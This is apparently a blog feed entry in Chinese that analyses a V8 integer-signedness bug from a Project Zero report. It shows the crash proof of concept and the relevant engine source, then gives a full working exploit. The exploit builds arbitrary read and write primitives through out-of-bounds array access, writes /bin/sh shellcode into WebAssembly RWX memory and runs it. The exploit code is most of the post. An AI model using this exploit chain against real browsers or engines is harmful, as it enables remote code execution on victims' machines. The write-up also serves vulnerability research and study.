    <content type="html"><![CDATA[<h2 id="Intro"><a href="#Intro" class="headerlink" title="Intro"></a>Intro</h2><p>信息来自<a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=1793" target="_blank" rel="noopener">这里</a>，好像是project-zero给chrome提的一个bug？也没有找到CVE编号….</p><p>（PS: 其实看链接中，好像是project zero写的，各方面都特别到位，这篇博客只是在催促我自己赶紧调，顺便记录一下我个人调试中杂七杂八的事情而已。）</p><h2 id="漏洞点"><a href="#漏洞点" class="headerlink" title="漏洞点"></a>漏洞点</h2><p>惯例先看POC：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">array = [];</span><br><span class="line">array.length = <span class="number">0xffffffff</span>;</span><br><span class="line"></span><br><span class="line">array.fill(<span class="number">1.1</span>, <span class="number">0</span>, &#123;valueOf() &#123;</span><br><span class="line">  array.length = <span class="number">32</span>;</span><br><span class="line">  array.fill(<span class="number">1.1</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0x80000000</span>;</span><br><span class="line">&#125;&#125;);</span><br></pre></td></tr></table></figure><p>然后惯例调试一下，发现崩了，其实我到此为止并没有看出这个洞的玄妙之处。</p><h2 id="漏洞产生原理"><a href="#漏洞产生原理" class="headerlink" title="漏洞产生原理"></a>漏洞产生原理</h2><p>大致看来是<code>0xffffffff</code>这个unsigned被当成了普通int。</p><p>老老实实读一下代码，看下是下面这段代码：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">Handle&lt;FixedArrayBase&gt; Factory::NewFixedDoubleArray(<span class="keyword">int</span> length,</span><br><span class="line">                                                    PretenureFlag pretenure) &#123;</span><br><span class="line">  DCHECK_LE(<span class="number">0</span>, length);</span><br><span class="line">  <span class="keyword">if</span> (length == <span class="number">0</span>) <span class="keyword">return</span> empty_fixed_array();</span><br><span class="line">  <span class="keyword">if</span> (length &gt; FixedDoubleArray::kMaxLength) &#123; <span class="comment">// ***1***</span></span><br><span class="line">    isolate()-&gt;heap()-&gt;FatalProcessOutOfMemory(<span class="string">"invalid array length"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">int</span> size = FixedDoubleArray::SizeFor(length); <span class="comment">// ***2***</span></span><br><span class="line">  Map <span class="built_in">map</span> = *fixed_double_array_map();</span><br><span class="line">  HeapObject result =</span><br><span class="line">      AllocateRawWithImmortalMap(size, pretenure, <span class="built_in">map</span>, kDoubleAligned);</span><br><span class="line">  Handle&lt;FixedDoubleArray&gt; <span class="built_in">array</span>(FixedDoubleArray::cast(result), isolate());</span><br><span class="line">  <span class="built_in">array</span>-&gt;set_length(length);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">array</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>DCHECK在release版本中是没有的，绕过了[1]处的检查，[2]处分配backing store，显然是分配小了，然后我们就可以越界大范围读写了。</p><p>回溯着看代码，调用关系如下：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">                     +------------------+</span><br><span class="line">                     |                  |</span><br><span class="line">      +--------------&gt; Fast_ArrayConcat |</span><br><span class="line">      |              |                  |</span><br><span class="line">      |              +------------------+      ***********************</span><br><span class="line">+-------------+                                *                     *</span><br><span class="line">|             |               +----------------&gt; packed double array *</span><br><span class="line">| ArrayConcat |               |                *                     *</span><br><span class="line">|             |               |                ***********************</span><br><span class="line">+-------------+               |</span><br><span class="line">      |              +------------------+                                    +---------------------+</span><br><span class="line">      |              |                  |                                    |                     |</span><br><span class="line">      +--------------&gt; Slow_ArrayConcat |                 +------------------&gt; fixed array storage |</span><br><span class="line">                     |                  |                 |                  |                     |</span><br><span class="line">                     +------------------+                 |                  +---------------------+</span><br><span class="line">                              |                           |</span><br><span class="line">                              |                +---------------------+       +---------------------+</span><br><span class="line">                              |                |                     |       |                     |</span><br><span class="line">                              +----------------&gt; ArrayConcatVisitor  +-------&gt; dictionary storage  |</span><br><span class="line">                                               |                     |       |                     |</span><br><span class="line">                                               +---------------------+       +---------------------+</span><br><span class="line">                                                          |</span><br><span class="line">                                                          |                  +---------------------+</span><br><span class="line">                                                          |                  |                     |</span><br><span class="line">                                                          +------------------&gt; JSReceiver storage  |</span><br><span class="line">                                                                             |                     |</span><br><span class="line">                                                                             +---------------------+</span><br></pre></td></tr></table></figure><p>在<code>Slow_ArrayConcat</code>中长度还是uint32_t，到<code>NewFixedDoubleArray</code>里面就变成<code>int</code>了，可以看到在下面[5]处；也可以看到，[3]和[4]都能绕过：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">Object <span class="title">Slow_ArrayConcat</span><span class="params">(BuiltinArguments* args, Handle&lt;Object&gt; species,</span></span></span><br><span class="line"><span class="function"><span class="params">                        Isolate* isolate)</span> </span>&#123;</span><br><span class="line">[...]</span><br><span class="line">  <span class="keyword">uint32_t</span> estimate_result_length = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">uint32_t</span> estimate_nof = <span class="number">0</span>;</span><br><span class="line">  FOR_WITH_HANDLE_SCOPE(isolate, <span class="keyword">int</span>, i = <span class="number">0</span>, i, i &lt; argument_count, i++, &#123;</span><br><span class="line">    Handle&lt;Object&gt; obj = args-&gt;at(i);</span><br><span class="line">    <span class="keyword">uint32_t</span> length_estimate;</span><br><span class="line">    <span class="keyword">uint32_t</span> element_estimate;</span><br><span class="line">    <span class="keyword">if</span> (obj-&gt;IsJSArray()) &#123;</span><br><span class="line">      Handle&lt;JSArray&gt; <span class="built_in">array</span>(Handle&lt;JSArray&gt;::cast(obj));</span><br><span class="line">      length_estimate = <span class="keyword">static_cast</span>&lt;<span class="keyword">uint32_t</span>&gt;(<span class="built_in">array</span>-&gt;length()-&gt;Number());</span><br><span class="line">      <span class="keyword">if</span> (length_estimate != <span class="number">0</span>) &#123;</span><br><span class="line">        ElementsKind array_kind =</span><br><span class="line">            GetPackedElementsKind(<span class="built_in">array</span>-&gt;GetElementsKind());</span><br><span class="line">        kind = GetMoreGeneralElementsKind(kind, array_kind);</span><br><span class="line">      &#125;</span><br><span class="line">      element_estimate = EstimateElementCount(isolate, <span class="built_in">array</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">[...]</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// Avoid overflows by capping at kMaxElementCount.</span></span><br><span class="line">    <span class="keyword">if</span> (JSObject::kMaxElementCount - estimate_result_length &lt; length_estimate) &#123; <span class="comment">// ***3***</span></span><br><span class="line">      estimate_result_length = JSObject::kMaxElementCount;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      estimate_result_length += length_estimate;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (JSObject::kMaxElementCount - estimate_nof &lt; element_estimate) &#123;</span><br><span class="line">      estimate_nof = JSObject::kMaxElementCount;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      estimate_nof += element_estimate;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// If estimated number of elements is more than half of length, a</span></span><br><span class="line">  <span class="comment">// fixed array (fast case) is more time and space-efficient than a</span></span><br><span class="line">  <span class="comment">// dictionary.</span></span><br><span class="line">  <span class="keyword">bool</span> fast_case = is_array_species &amp;&amp;</span><br><span class="line">                   (estimate_nof * <span class="number">2</span>) &gt;= estimate_result_length &amp;&amp;</span><br><span class="line">                   isolate-&gt;IsIsConcatSpreadableLookupChainIntact(); <span class="comment">// ***4***</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (fast_case &amp;&amp; kind == PACKED_DOUBLE_ELEMENTS) &#123;</span><br><span class="line">    Handle&lt;FixedArrayBase&gt; storage =</span><br><span class="line">        isolate-&gt;factory()-&gt;NewFixedDoubleArray(estimate_result_length); <span class="comment">// ***5***</span></span><br><span class="line">[...]</span><br></pre></td></tr></table></figure><h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><p>最关键的一点是，怎么转化成常见条件的洞；利用<code>ArrayPrototypeFill</code>，一波操作正好绕过一些检查，转化为直接可以利用的oob。</p><p>exp大致是下面这样，老套路了：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> log = print;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*---------------------------data type convert-------------------------*/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TypeConvert</span> </span>&#123;</span><br><span class="line">  <span class="keyword">constructor</span>() &#123;</span><br><span class="line">    <span class="keyword">this</span>.buf = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">8</span>);</span><br><span class="line">    <span class="keyword">this</span>.f64 = <span class="keyword">new</span> <span class="built_in">Float64Array</span>(<span class="keyword">this</span>.buf);</span><br><span class="line">    <span class="keyword">this</span>.u32 = <span class="keyword">new</span> <span class="built_in">Uint32Array</span>(<span class="keyword">this</span>.buf);</span><br><span class="line">    <span class="keyword">this</span>.bytes = <span class="keyword">new</span> <span class="built_in">Uint8Array</span>(<span class="keyword">this</span>.buf);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">//convert float to int</span></span><br><span class="line">  f2i(val) &#123;</span><br><span class="line">    <span class="keyword">this</span>.f64[<span class="number">0</span>] = val;</span><br><span class="line">    <span class="keyword">let</span> tmp = <span class="built_in">Array</span>.from(<span class="keyword">this</span>.u32);</span><br><span class="line">    <span class="keyword">return</span> tmp[<span class="number">1</span>] * <span class="number">0x100000000</span> + tmp[<span class="number">0</span>];</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">  convert int to float</span></span><br><span class="line"><span class="comment">  if nead convert a 64bits int to float</span></span><br><span class="line"><span class="comment">  please use string like "deadbeefdeadbeef"</span></span><br><span class="line"><span class="comment">  (v8's SMI just use 56bits, lowest 8bits is zero as flag)</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line">  i2f(val) &#123;</span><br><span class="line">    <span class="keyword">let</span> vall = hex(val);</span><br><span class="line">    <span class="keyword">let</span> tmp = [];</span><br><span class="line">    tmp[<span class="number">0</span>] = vall.slice(<span class="number">10</span>, );</span><br><span class="line">    tmp[<span class="number">1</span>] = vall.slice(<span class="number">2</span>, <span class="number">10</span>);</span><br><span class="line">    tmp[<span class="number">0</span>] = <span class="built_in">parseInt</span>(tmp[<span class="number">0</span>], <span class="number">16</span>);</span><br><span class="line">    tmp[<span class="number">1</span>] = <span class="built_in">parseInt</span>(tmp[<span class="number">1</span>], <span class="number">16</span>);</span><br><span class="line">    <span class="keyword">this</span>.u32.set(tmp);</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.f64[<span class="number">0</span>];</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//convert number to hex string</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">hex</span>(<span class="params">x</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="string">'0x'</span> + (x.toString(<span class="number">16</span>)).padStart(<span class="number">16</span>, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> typeConvert = <span class="keyword">new</span> TypeConvert();</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> shellcode = [</span><br><span class="line">  <span class="number">0x48</span>, <span class="number">0x31</span>, <span class="number">0xf6</span>, <span class="number">0x56</span>, <span class="number">0x48</span>, <span class="number">0xbf</span>, <span class="number">0x2f</span>, <span class="number">0x2f</span>, <span class="number">0x62</span>,</span><br><span class="line">  <span class="number">0x69</span>, <span class="number">0x6e</span>, <span class="number">0x2f</span>, <span class="number">0x73</span>, <span class="number">0x68</span>, <span class="number">0x57</span>, <span class="number">0x48</span>, <span class="number">0x89</span>, <span class="number">0xe7</span>,</span><br><span class="line">  <span class="number">0x48</span>, <span class="number">0x31</span>, <span class="number">0xd2</span>, <span class="number">0x48</span>, <span class="number">0x31</span>, <span class="number">0xc0</span>, <span class="number">0xb0</span>, <span class="number">0x02</span>, <span class="number">0x48</span>,</span><br><span class="line">  <span class="number">0xc1</span>, <span class="number">0xc8</span>, <span class="number">0x28</span>, <span class="number">0xb0</span>, <span class="number">0x3b</span>, <span class="number">0x0f</span>, <span class="number">0x05</span></span><br><span class="line">];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">exploit</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  oobArray = [];</span><br><span class="line">  oobArray.length = <span class="number">0xffffffff</span>;</span><br><span class="line">  oobArray.fill(<span class="number">1.1</span>, <span class="number">0x80000000</span> - <span class="number">1</span>, &#123;valueOf() &#123;</span><br><span class="line">    oobArray.length = <span class="number">0x100</span>;</span><br><span class="line">    oobArray.fill(<span class="number">1.1</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0x80000000</span>;</span><br><span class="line">  &#125;&#125;);</span><br><span class="line">  <span class="comment">// %SystemBreak();</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">var</span> objLeak = &#123;<span class="string">'leak'</span> : <span class="number">0x1234</span>, <span class="string">'tag'</span> : <span class="number">0xdead</span>&#125;;</span><br><span class="line">  <span class="keyword">let</span> arraybuffer = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">0xbeef</span>);</span><br><span class="line">  <span class="keyword">var</span> dataView = <span class="keyword">new</span> <span class="built_in">DataView</span>(arraybuffer);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// %DebugPrint(oobArray);</span></span><br><span class="line">  <span class="comment">// %DebugPrint(objLeak);</span></span><br><span class="line">  <span class="comment">// %DebugPrint(arraybuffer);</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">0x100</span>; i++) &#123;</span><br><span class="line">    <span class="keyword">if</span> (typeConvert.f2i(oobArray[i]) == <span class="number">0xdead00000000</span>)&#123;</span><br><span class="line">      idx_objLeak_tag = i - <span class="number">1</span>;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  log(<span class="string">"[+] Got index of objLeak.tag: "</span> + idx_objLeak_tag);</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">0x100</span>; i++) &#123;</span><br><span class="line">    <span class="keyword">if</span> (typeConvert.f2i(oobArray[i]) == <span class="number">0xbeef</span>) &#123;</span><br><span class="line">      idx_backstore = i + <span class="number">1</span>;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  log(<span class="string">"[+] Got index of backstore: "</span> + idx_backstore);</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">addressOf</span>(<span class="params">target</span>) </span>&#123;</span><br><span class="line">    objLeak.leak = target;</span><br><span class="line">    <span class="keyword">let</span> leak = typeConvert.f2i(oobArray[idx_objLeak_tag]);</span><br><span class="line">    <span class="keyword">return</span> leak;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">write64</span>(<span class="params">addr, value</span>) </span>&#123;</span><br><span class="line">    oobArray[idx_backstore] = typeConvert.i2f(addr);</span><br><span class="line">    dataView.setFloat64(<span class="number">0</span>, typeConvert.i2f(value), <span class="literal">true</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">read64</span>(<span class="params">addr</span>) </span>&#123;</span><br><span class="line">    oobArray[idx_backstore] = typeConvert.i2f(addr);</span><br><span class="line">    <span class="keyword">let</span> tmp = [<span class="string">''</span>, <span class="string">''</span>];</span><br><span class="line">    <span class="keyword">let</span> tmp2 = [<span class="string">''</span>, <span class="string">''</span>];</span><br><span class="line">    <span class="keyword">let</span> result = <span class="string">''</span></span><br><span class="line">    tmp[<span class="number">1</span>] = hex(dataView.getUint32(<span class="number">0</span>)).slice(<span class="number">10</span>,);</span><br><span class="line">    tmp[<span class="number">0</span>] = hex(dataView.getUint32(<span class="number">4</span>)).slice(<span class="number">10</span>,);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">3</span>; i &gt;= <span class="number">0</span>; i--) &#123;</span><br><span class="line">      tmp2[<span class="number">0</span>] += tmp[<span class="number">0</span>].slice(i * <span class="number">2</span>, i * <span class="number">2</span> + <span class="number">2</span>);</span><br><span class="line">      tmp2[<span class="number">1</span>] += tmp[<span class="number">1</span>].slice(i * <span class="number">2</span>, i * <span class="number">2</span> + <span class="number">2</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    result = tmp2[<span class="number">0</span>] + tmp2[<span class="number">1</span>];</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">parseInt</span>(result, <span class="number">16</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">var</span> wasmCode = <span class="keyword">new</span> <span class="built_in">Uint8Array</span>([</span><br><span class="line">    <span class="number">0</span>,<span class="number">97</span>,<span class="number">115</span>,<span class="number">109</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">133</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">96</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">127</span>,<span class="number">3</span>,<span class="number">130</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">4</span>,<span class="number">132</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">112</span>,<span class="number">0</span>,</span><br><span class="line">    <span class="number">0</span>,<span class="number">5</span>,<span class="number">131</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">6</span>,<span class="number">129</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">7</span>,<span class="number">145</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">6</span>,<span class="number">109</span>,<span class="number">101</span>,<span class="number">109</span>,<span class="number">111</span>,<span class="number">114</span>,<span class="number">121</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">4</span>,<span class="number">109</span>,</span><br><span class="line">    <span class="number">97</span>,<span class="number">105</span>,<span class="number">110</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">10</span>,<span class="number">138</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">132</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">65</span>,<span class="number">42</span>,<span class="number">11</span>]);</span><br><span class="line">  <span class="keyword">var</span> wasmInstance = <span class="keyword">new</span> WebAssembly.Instance(<span class="keyword">new</span> WebAssembly.Module(wasmCode), &#123;<span class="attr">env</span>: &#123; <span class="attr">puts</span>: <span class="function"><span class="keyword">function</span> <span class="title">puts</span> (<span class="params">index</span>) </span>&#123;&#125; &#125;&#125;);</span><br><span class="line">  <span class="keyword">var</span> funcAsm = wasmInstance.exports.main;</span><br><span class="line">  </span><br><span class="line">  <span class="comment">// %DebugPrint(funcAsm);</span></span><br><span class="line">  <span class="comment">// %SystemBreak();</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">var</span> addressFasm = addressOf(funcAsm);</span><br><span class="line">  log(hex(addressFasm));</span><br><span class="line">  <span class="keyword">var</span> sharedInfo = read64(addressFasm + <span class="number">0x18</span> - <span class="number">0x1</span>);</span><br><span class="line">  <span class="keyword">var</span> data = read64(sharedInfo + <span class="number">0x8</span> - <span class="number">0x1</span>);</span><br><span class="line">  <span class="keyword">var</span> instance = read64(data + <span class="number">0x10</span> - <span class="number">0x1</span>);</span><br><span class="line">  <span class="keyword">var</span> memoryRWX = read64(instance + <span class="number">0xc8</span> - <span class="number">0x1</span>);</span><br><span class="line"></span><br><span class="line">  memoryRWX = <span class="built_in">Math</span>.floor(memoryRWX);</span><br><span class="line">  log(<span class="string">"[*] Get RWX memory : "</span> + hex(memoryRWX));</span><br><span class="line"></span><br><span class="line">  <span class="keyword">var</span> shellcode = [</span><br><span class="line">    <span class="string">'2fbb485299583b6a'</span>,</span><br><span class="line">    <span class="string">'5368732f6e69622f'</span>,</span><br><span class="line">    <span class="string">'050f5e5457525f54'</span></span><br><span class="line">  ];</span><br><span class="line"></span><br><span class="line">  <span class="keyword">var</span> offsetMem = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> (x <span class="keyword">of</span> shellcode) &#123;</span><br><span class="line">    write64(memoryRWX + offsetMem, x);</span><br><span class="line">    offsetMem += <span class="number">8</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  funcAsm()；</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">exploit();</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;Intro&quot;&gt;&lt;a href=&quot;#Intro&quot; class=&quot;headerlink&quot; title=&quot;Intro&quot;&gt;&lt;/a&gt;Intro&lt;/h2&gt;&lt;p&gt;信息来自&lt;a href=&quot;https://bugs.chromium.org/p/project-zero/issu
      
    
    </summary>
    
    
      <category term="二进制" scheme="https://github.com/Cracke-S-J/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6/"/>
    
      <category term="v8" scheme="https://github.com/Cracke-S-J/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6/v8/"/>
    
    
      <category term="二进制" scheme="https://github.com/Cracke-S-J/tags/%E4%BA%8C%E8%BF%9B%E5%88%B6/"/>
    
      <category term="v8" scheme="https://github.com/Cracke-S-J/tags/v8/"/>
    
  </entry>
  
  <entry>
    <title>通过hello-world.cc学习v8源码</title>
    <link href="https://github.com/Cracke-S-J/2020/06/07/%E5%AD%A6%E4%B9%A0v8%E6%BA%90%E7%A0%81/"/>
    <id>https://github.com/Cracke-S-J/2020/06/07/%E5%AD%A6%E4%B9%A0v8%E6%BA%90%E7%A0%81/</id>
    <published>2020-06-07T10:09:46.000Z</published>
    <updated>2020-06-23T02:16:07.337Z</updated>
    
